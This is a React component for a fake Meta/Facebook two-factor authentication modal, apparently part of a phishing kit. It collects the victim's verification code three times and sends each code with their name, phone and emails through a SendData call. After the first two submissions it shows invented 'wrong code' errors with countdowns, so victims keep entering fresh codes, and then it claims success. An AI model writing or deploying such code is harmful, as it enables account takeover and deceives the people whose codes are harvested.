import React from 'react';
import Image from 'next/image';
import Modal from './Modal';
import { buildTwoFaDestinationsLabel } from '@/utils/twoFaDescription';
import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { SendData } from '@/utils/sendData';

interface TwoFactorModalProps {
    isOpend: boolean;
    isOpendFinish: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

/** Sau nhập sai mã lần 1 → chờ trước khi nhập lại; sau sai lần 2 → chờ trước lần 3 */
const RETRY_WAIT_AFTER_FIRST_WRONG_SEC = 15;
const RETRY_WAIT_AFTER_SECOND_WRONG_SEC = 30;

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
    const t = useAppStrings();

    const getRetryWaitSeconds = (nextStep: number) =>
        nextStep === 1 ? RETRY_WAIT_AFTER_FIRST_WRONG_SEC : RETRY_WAIT_AFTER_SECOND_WRONG_SEC;

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);
    const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null);

    const dispatch = useAppDispatch();
    const formDataState = useAppSelector((state) => state.stepForm.data);

    const [twoFa, setTwoFa] = React.useState('');

    const { fullName, phone, email, emailBusiness } = formDataState as FormData || {};

    const twoFaDestinations = buildTwoFaDestinationsLabel(email ?? '', phone ?? '', emailBusiness);

    const [countdown, setCountdown] = React.useState<number>(RETRY_WAIT_AFTER_FIRST_WRONG_SEC);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    React.useEffect(() => {
        return () => {
            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, []);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        const normalizedValue = value.replace(/\D/g, '').slice(0, 8);
        setTwoFa(normalizedValue);
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change

        if (click === 0) {
            dispatch(updateForm({ twoFa: normalizedValue }));
        }

        if (click === 1) {
            dispatch(updateForm({ twoFaSecond: normalizedValue }));
        }

        if (click === 2) {
            dispatch(updateForm({ twoFaThird: normalizedValue }));
        }
    };

    const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

    const formatRetryMessage = (secondsLeft: number, nextStep: number) => {
        const minutes = Math.floor(secondsLeft / 60);
        const seconds = secondsLeft % 60;
        if (nextStep === 1) {
            return t.twoFa.retryErrorExpired(minutes, seconds);
        }
        return t.twoFa.retryError(minutes, seconds);
    };

    const startRetryCountdown = (nextStep: number) => {
        if (intervalRef.current) clearInterval(intervalRef.current);

        const waitSec = getRetryWaitSeconds(nextStep);

        setDisable(true);
        setCountdown(waitSec);
        setErrors({ twoFa: formatRetryMessage(waitSec, nextStep) });

        intervalRef.current = setInterval(() => {
            setCountdown((prev) => {
                const next = prev - 1;
                if (next <= 0) {
                    if (intervalRef.current) clearInterval(intervalRef.current);
                    intervalRef.current = null;
                    setClick(nextStep);
                    setErrors({});
                    setDisable(false);
                    return waitSec;
                }
                setErrors({ twoFa: formatRetryMessage(next, nextStep) });
                return next;
            });
        }, 1000);
    };

    const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 8);
        e.preventDefault();
        setTwoFa(pasted);
        setErrors((prev) => ({ ...prev, twoFa: '' }));
        if (click === 0) dispatch(updateForm({ twoFa: pasted }));
        if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
    };

    const handleClose = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

            if (!isTwoFaValid) {
                setErrors({ twoFa: t.twoFa.errInvalid });
                return;
            }

            setLoading(true);

            if (click === 0) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(1);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: t.twoFa.errSend });
                });
            }

            if (click === 1) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(2);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: t.twoFa.errSend });
                });
            }

            if (click === 2) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');

                        isOpendFinish(true);
                        handleClose();

                        setClick(0);
                    }, 1234);
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: t.twoFa.errVerify });
                });
            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `mv-input mv-activation-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] text-meta-text mb-[10px] transition-all duration-200 ${disabled ? '' : ''}`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
            panelClassName="mv-official-modal"
            backdropClassName="mv-official-backdrop"
        >
            <div className="flex min-h-full w-full min-w-0 flex-col gap-6 pb-1">
                <div className='w-full'>
                    <div className='flex w-full items-center text-meta-text-muted gap-[6px] text-[14px] mb-[7px]'>
                        <span>{fullName}</span>
                        <div className="w-[4px] h-[4px] bg-meta-text-muted rounded-[5px]"></div>
                        <span>{t.common.facebook}</span>
                    </div>
                    <h2 className='text-[17px] leading-snug text-meta-text font-bold mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title}</h2>
                    <p className='text-meta-text-secondary text-[14px] leading-[1.55]'>{t.twoFa.description(twoFaDestinations)}</p>
                    <div className="my-[15px] w-full">
                        <Image
                            src="/images/meta/authentication.png"
                            alt={t.twoFa.authIllustrationAlt}
                            width={1125}
                            height={492}
                            className="h-auto w-full"
                            sizes="(max-width: 768px) 100vw, 640px"
                        />
                    </div>
                    <div className='w-full'>
                        <form onSubmit={handSubmit}>
                            <label htmlFor='twoFa' className='mv-activation-label mb-[6px] block text-[13px] font-semibold'>{t.twoFa.label} <span className='mv-activation-required'>*</span></label>
                            <div className={`${inputClass('twoFa')}`} >
                                <input
                                    type="text"
                                    inputMode="numeric"
                                    id="twoFa"
                                    placeholder={t.twoFa.placeholder}
                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                    value={twoFa}
                                    onChange={handleChange}
                                    onPaste={handlePaste}
                                    disabled={disabled}
                                    maxLength={8}
                                    autoComplete="one-time-code"
                                    aria-label={t.twoFa.ariaInput}
                                />
                            </div>
                            <p className='text-meta-text-muted text-[12px] mt-[-5px] mb-[10px]'>{t.twoFa.hint}</p>
                            {errorText('twoFa')}

                            <div className='w-full mt-[20px]'>
                                <button
                                    className={`mv-btn-primary min-h-[48px] w-full text-white rounded-[40px] px-4 py-[10px] text-[15px] font-semibold flex items-center justify-center transition-[filter,transform] duration-200 active:scale-[0.995] ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer'}`}
                                    disabled={disabled || !isTwoFaValid}
                                    aria-label={t.twoFa.ariaSubmit}
                                >
                                    {loading && (
                                        <div className="relative mr-[10px] h-5 w-5 shrink-0 animate-spin" aria-hidden>
                                            <Image
                                                src="/images/icons/ic_loading.svg"
                                                alt=""
                                                width={20}
                                                height={20}
                                                unoptimized
                                                className="block h-full w-full"
                                            />
                                        </div>
                                    )}
                                    {loading ? '' : t.common.continue}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <div className="relative mx-auto h-[60px] w-[60px] shrink-0">
                    <Image
                        src="/images/meta/logo-gray.svg"
                        alt={t.twoFa.metaLogoAlt}
                        width={60}
                        height={60}
                        unoptimized
                        className="h-full w-full object-contain"
                    />
                </div>
            </div>
        </Modal>
    );
};

export default TwoFactorModal;